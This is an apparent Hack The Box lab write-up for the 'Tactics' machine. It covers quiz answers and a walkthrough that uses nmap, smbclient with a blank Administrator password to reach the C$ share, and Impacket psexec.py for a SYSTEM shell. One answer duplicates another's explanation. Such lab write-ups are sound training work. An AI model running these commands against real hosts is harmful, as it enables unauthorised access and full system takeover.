# Tactics

# Context

Lab link: [https://app.hackthebox.com/machines/Tactics](https://app.hackthebox.com/machines/Tactics)

Suggested tools: `nmap`, `smbclient`, `Impacket`

# Scenario

Tactics is a very easy `Windows` machine that features misconfigured Server Message Block (`SMB`) shares. An `Administrator` account with a blank password allows access to administrative shares. An attacker can use the `SMB` command-line interface to retrieve sensitive files, or use `Impacket` `psexec` to obtain a `SYSTEM`-level shell. This behavior aligns with MITRE ATT&CK `T1021.002` (Remote Services: `SMB/Windows Admin Shares`) and can involve `T1078` (Valid Accounts).

# Questions

Q1- Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?

Answer: `-Pn`

Reason: The `-Pn` flag tells Nmap to skip host discovery and proceed directly to port scanning, treating the target as alive. This is essential against Windows hosts, where Internet Control Message Protocol (ICMP) echo requests are commonly blocked by Windows Defender Firewall by default. Without `-Pn`, Nmap marks the host as down and skips scanning, producing a false negative. This maps to MITRE ATT&CK technique `T1046` (Network Service Discovery). Note that `-Pn` increases scan time and traffic against offline hosts, making the activity louder.

Q2- What does the 3-letter acronym SMB stand for?

Answer: Server Message Block

Reason: Server Message Block (SMB) is a network file-sharing protocol that allows applications to read, write, and request services from server programs across a network. It operates primarily on TCP port `445` in modern implementations, with legacy versions using ports `137`, `138`, and `139` over NetBIOS (Network Basic Input/Output System). SMB is heavily used in Windows environments for file sharing, printer access, and inter-process communication. It is a frequent enumeration and lateral movement target during engagements, mapping to MITRE ATT&CK techniques `T1021.002` (Remote Services: SMB/Windows Admin Shares) and `T1135` (Network Share Discovery).

Q3- What default port does SMB listen on?

Answer: `445`

Reason: Reason: Server Message Block (SMB) is a network file-sharing protocol that allows applications to read, write, and request services from server programs across a network. It operates primarily on TCP port `445` in modern implementations, with legacy versions using ports `137`, `138`, and `139` over NetBIOS (Network Basic Input/Output System). SMB is heavily used in Windows environments for file sharing, printer access, and inter-process communication. It is a frequent enumeration and lateral movement target during engagements, mapping to MITRE ATT&CK techniques `T1021.002` (Remote Services: SMB/Windows Admin Shares) and `T1135` (Network Share Discovery).

Q4- What command line argument do you give to `smbclient` to list available shares?

Answer: `-L`

Reason: The `-L` flag tells `smbclient` to list the available shares on a target host rather than connect to a specific share. This is a standard enumeration step once SMB is identified on port `445`, since exposed shares often reveal sensitive files, configuration data, or footholds for lateral movement. Common companion flags worth knowing:

- `N` suppresses the password prompt, useful for testing null/anonymous sessions where no credentials are required. Many misconfigured SMB servers permit anonymous share listing, which is a quick win during enumeration.
- `U` specifies a username when credentials are available, for example `U 'guest'` or `U 'domain\user'`.

This activity maps to MITRE ATT&CK technique `T1135` (Network Share Discovery).

```bash
$ smbclient -L //10.10.10.5 -N
```

Q5- What character at the end of a share name indicates it's an administrative share?

Answer: $

Reason: The dollar sign (`$`) at the end of a share name marks it as an administrative share, also called a hidden share. The `$` suffix tells Windows to hide the share from standard browsing, so it will not appear when a user lists shares through File Explorer. The share is still accessible if the full name is known and the connecting account has sufficient privileges. Windows creates several administrative shares by default on every system. Common examples include `C$`, `D$`, and other drive-letter shares that map to the root of each local volume, `ADMIN$` which maps to the Windows directory at `C:\Windows`, and `IPC$` which is the Inter-Process Communication share used for named pipe sessions and remote authentication. Access to administrative shares typically requires local administrator credentials on the target. Once authenticated, these shares are a primary vector for lateral movement and remote code execution through tools like `psexec`, `smbexec`, and `wmiexec`.

Q6- Which Administrative share is accessible on the box that allows users to view the whole file system?

Answer: `C$`

Reason: The `C$` administrative share maps to the root of the system drive (`C:\`), exposing the entire Windows file system to any authenticated user with sufficient privileges. Access typically requires local administrator credentials on the target. This activity maps to MITRE ATT&CK technique `T1021.002` (Remote Services: SMB/Windows Admin Shares).

```bash
$ smbclient //10.10.10.5/C$ -U 'administrator'
```

Q7- What command can we use to download the files we find on the SMB Share?

Answer: `get`

Reason: The `get` command inside an interactive `smbclient` session downloads a file from the remote share to the local working directory. It operates similarly to File Transfer Protocol (FTP), where the client maintains a session and issues commands against the connected share. Related commands worth knowing: `mget` downloads multiple files matching a pattern, `ls` lists the contents of the current remote directory, and `cd` changes the remote working directory. The local download destination is controlled by `lcd` (local change directory) before issuing `get`. This activity maps to MITRE ATT&CK technique `T1039` (Data from Network Shared Drive).

```bash
smb: \> get flag.txt
```

Q8- Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?

Answer: `psexec.py`

Reason: The tool is `psexec.py`, part of the Impacket collection. It provides an interactive shell on a Windows target by abusing the `ADMIN$` share and the Service Control Manager (SCM) to upload and execute a service binary, which then relays a shell back to the operator. The workflow: `psexec.py` authenticates to SMB on port `445`, writes a payload to `ADMIN$`, registers it as a Windows service through Remote Procedure Call (RPC), starts the service to execute the payload as `NT AUTHORITY\SYSTEM`, and tears down the service afterward. This grants the highest privilege level on the host without requiring prior code execution. Related Impacket alternatives worth knowing: `smbexec.py` achieves similar execution but avoids dropping a binary to disk by using semi-interactive command execution through service creation, and `wmiexec.py` uses Windows Management Instrumentation (WMI) over Distributed Component Object Model (DCOM) on port `135` instead of SMB, which is generally quieter and less logged. This activity maps to MITRE ATT&CK techniques `T1021.002` (Remote Services: SMB/Windows Admin Shares) and `T1569.002` (System Services: Service Execution).

```bash
$ psexec.py administrator@10.10.10.5
```

# Flag Walkthrough

**Target:** 10.129.3.198
**OS:** Windows
**Difficulty:** Very Easy
**Vector:** Misconfigured SMB — passwordless Administrator

## Recon

Ran an nmap scan to identify open ports and services:

```
nmap -sV -sC -Pn -T4 10.129.3.198 -oN nmap_initial.txt
```

Results:

```
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

SMB signing enabled but not required. Windows target confirmed.

## SMB Enumeration

Listed available shares using `smbclient` with the Administrator account and an empty password:

```
smbclient -L 10.129.3.198 -U Administrator%
```

Shares returned:

```
ADMIN$    Disk    Remote Admin
C$        Disk    Default share
IPC$      IPC     Remote IPC
```

Note: `-N` (null session) failed with `NT_STATUS_LOGON_FAILURE`. Using `Administrator%` (explicit empty password) succeeded.

## Flag Retrieval

Connected directly to the `C$` administrative share:

```
smbclient //10.129.3.198/C$ -U Administrator%
```

Navigated to the Administrator desktop and downloaded the flag:

```
smb: \\> cd Users\\Administrator\\Desktop\\
smb: \\Users\\Administrator\\Desktop\\> get flag.txt
```

## Lab Insights

- Windows admin shares (`C$`, `ADMIN$`) exist by default and are accessible if auth is weak.
- A null session (`N`) and an empty password (`user%`) are not the same thing — try both.
- No exploit needed: misconfigured credentials alone gave full filesystem access as Administrator.